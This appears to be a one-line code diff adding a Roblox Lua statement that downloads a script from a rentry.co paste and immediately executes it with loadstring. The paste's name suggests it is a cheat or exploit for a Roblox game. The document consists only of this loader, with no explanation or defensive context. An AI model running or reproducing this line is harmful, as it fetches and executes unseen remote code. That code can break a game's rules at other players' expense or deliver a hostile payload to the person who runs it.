@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rentry.co/BloodHoodFucker/raw", true))()
